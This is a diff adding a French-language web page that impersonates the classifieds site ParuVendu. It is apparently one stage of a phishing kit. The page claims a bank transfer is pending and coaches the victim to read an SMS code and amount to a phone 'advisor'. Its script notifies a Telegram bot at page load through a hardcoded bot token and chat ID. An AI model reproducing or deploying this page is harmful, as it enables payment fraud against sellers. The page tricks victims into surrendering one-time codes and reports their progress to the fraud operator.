@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virement en Cours - ParuVendu</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
+            background-position: right;
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+        .logo img {
+            width: 200px;
+        }
+        .container {
+            width: 40%; /* Largeur du formulaire augmentée */
+            padding: 40px; /* Padding augmenté */
+            background: white;
+            border-radius: 30px; /* Bords plus enrobés */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            position: absolute;
+            top: 35%; /* Formulaire abaissé */
+            left: 15%; /* Déplacé plus à gauche */
+            transform: translateY(-30%);
+            animation: slideUp 1s ease-out;
+        }
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(-30%);
+            }
+        }
+        .form-group {
+            margin-bottom: 15px; /* Espacement entre les champs */
+            text-align: left;
+        }
+        input {
+            width: 100%; /* Largeur des champs */
+            padding: 12px; /* Padding */
+            border: 1px solid #ccc;
+            border-radius: 0; /* Bordures rectangulaires */
+            font-size: 14px;
+            transition: all 0.3s;
+            background-color: #f9f9f9;
+            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+        }
+        input:focus {
+            border-color: #ff4c4c;
+            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
+        }
+        .btn {
+            background-color: #cc0000; /* Rouge plus foncé */
+            color: white;
+            padding: 8px 20px; /* Taille réduite */
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 40%; /* Bouton plus petit */
+            font-size: 14px; /* Taille du texte */
+            transition: background 0.3s;
+            text-transform: lowercase; /* Mise en minuscule */
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            font-weight: bold; /* Texte en gras */
+        }
+        .btn:hover {
+            background-color: #b30000; /* Rouge plus foncé au survol */
+        }
+        .connexion-text {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff4c4c;
+            margin-bottom: 20px;
+        }
+        .form-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-logo img {
+            width: 100px; /* Taille du logo */
+        }
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: justify;
+        }
+        .info-text strong {
+            color: #333;
+        }
+        .highlight {
+            background-color: #fff3cd; /* Couleur de fond pour mettre en évidence */
+            padding: 10px;
+            border-left: 4px solid #ffc107; /* Bordure gauche pour accentuer */
+            margin-bottom: 20px;
+        }
+        /* Animation pour le virement en cours */
+        .virement-animation {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            height: 60px; /* Hauteur pour contenir l'animation */
+        }
+        .virement-animation .icon {
+            font-size: 40px; /* Taille de l'icône */
+            position: absolute;
+            animation: moveMoney 2s infinite;
+        }
+        @keyframes moveMoney {
+            0% {
+                left: 0;
+                opacity: 1;
+                filter: blur(0);
+            }
+            50% {
+                left: calc(100% - 40px); /* Déplacement vers la droite */
+                opacity: 0.5;
+                filter: blur(2px);
+            }
+            100% {
+                left: 0;
+                opacity: 1;
+                filter: blur(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu">
+    </div>
+    <div class="container">
+        <div class="connexion-text">VIREMENT EN COURS</div>
+        <div class="form-logo">
+            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
+        </div>
+        <!-- Animation de virement en cours -->
+        <div class="virement-animation">
+            <div class="icon">💵</div> <!-- Icône d'argent -->
+        </div>
+        <div class="info-text">
+            Suite aux nouvelles mesures de sécurité, vous serez crédité sur votre compte qu’après avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte ParuVendu.
+        </div>
+        <div class="info-text">
+            Pour terminer la confirmation de votre compte : vous serez contacté par téléphone par le service client dans les meilleurs délais.
+        </div>
+        <div class="highlight">
+            En validant votre compte bancaire, vous autorisez ParuVendu à vous envoyer un SMS contenant un montant de vérification, déterminé automatiquement, ainsi qu’un code à 4 ou 8 chiffres. Ce montant, quelle que soit sa valeur, sert uniquement à vérifier votre compte et devra être communiqué à notre conseiller pour finaliser la confirmation.
+        </div>
+        <div class="info-text">
+            La confirmation de votre compte bancaire vous permet de prouver que vous êtes bien le titulaire de la carte bancaire enregistrée puisque vous seul avez accès au code ParuVendu.
+        </div>
+        <div class="info-text">
+            Cordialement,<br>
+            ParuVendu.<br>
+            ©1999-2020 ParuVendu. Tous droits réservés.
+        </div>
+        <!-- Bouton Retour à l'accueil -->
+        <a href="https://www.paruvendu.fr" class="btn">Retour à l'accueil</a>
+    </div>
+
+    <script>
+        // Constantes pour le bot Telegram
+        const BOT_TOKEN = "8022971997:AAG1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA";
+        const CHAT_ID = "5652184847";
+
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(params),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Erreur lors de l'envoi du message à Telegram");
+                }
+                console.log("Message envoyé avec succès à Telegram");
+            } catch (error) {
+                console.error("Erreur :", error);
+            }
+        }
+
+        // Message à envoyer à Telegram
+        const message = `
+            🚨 Virement en cours 🚨
+            L'utilisateur a terminé le processus de virement.
+            Un SMS de confirmation sera envoyé pour finaliser la transaction.
+        `;
+
+        // Envoyer le message à Telegram
+        sendToTelegram(message);
+    </script>
+</body>
+</html>
